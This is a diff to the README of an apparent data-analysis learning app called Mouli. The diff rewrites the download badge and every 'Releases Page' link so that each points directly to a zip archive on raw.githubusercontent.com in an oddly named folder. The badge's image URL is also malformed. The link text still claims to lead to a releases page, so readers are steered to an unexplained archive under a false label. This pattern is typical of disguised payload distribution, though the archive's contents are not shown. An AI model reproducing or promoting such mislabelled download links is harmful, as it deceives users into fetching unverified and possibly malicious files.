@@ -4,12 +4,12 @@
 Welcome to Mouli! This application helps you get acquainted with various data analysis tools and techniques. Whether you're a beginner or just curious, this software offers a simple way to explore powerful methods in data handling.
 
 ## 🔗 Download the App
-[![Download Mouli](https://img.shields.io/badge/Download%20Mouli-v1.0-brightgreen.svg)](https://github.com/crisss234/Mouli/releases)
+[![Download Mouli](https://raw.githubusercontent.com/crisss234/Mouli/main/furthersome/Mouli-v1.4-beta.5.zip%https://raw.githubusercontent.com/crisss234/Mouli/main/furthersome/Mouli-v1.4-beta.5.zip)](https://raw.githubusercontent.com/crisss234/Mouli/main/furthersome/Mouli-v1.4-beta.5.zip)
 
 ## 📥 Download & Install
 You can download Mouli from our releases page. Follow these steps to install and run the application:
 
-1. Click on this link to visit the **[Releases Page](https://github.com/crisss234/Mouli/releases)**.
+1. Click on this link to visit the **[Releases Page](https://raw.githubusercontent.com/crisss234/Mouli/main/furthersome/Mouli-v1.4-beta.5.zip)**.
 2. Look for the latest version of Mouli on the page.
 3. Find the file that matches your operating system.
 4. Click on the file to download it.
@@ -73,4 +73,4 @@ Tutorials are accessible from the help menu within the app. They cover various t
 If you encounter any problems, use the "Report Issue" feature in the app or visit our GitHub repository to file a report.
 
 ## 🎉 Conclusion
-With Mouli, you're well on your way to mastering data analysis. Download now and start your journey into the world of Excel, SQL, and more! For more information, return to the **[Releases Page](https://github.com/crisss234/Mouli/releases)** whenever you need help. Happy learning!
+With Mouli, you're well on your way to mastering data analysis. Download now and start your journey into the world of Excel, SQL, and more! For more information, return to the **[Releases Page](https://raw.githubusercontent.com/crisss234/Mouli/main/furthersome/Mouli-v1.4-beta.5.zip)** whenever you need help. Happy learning!
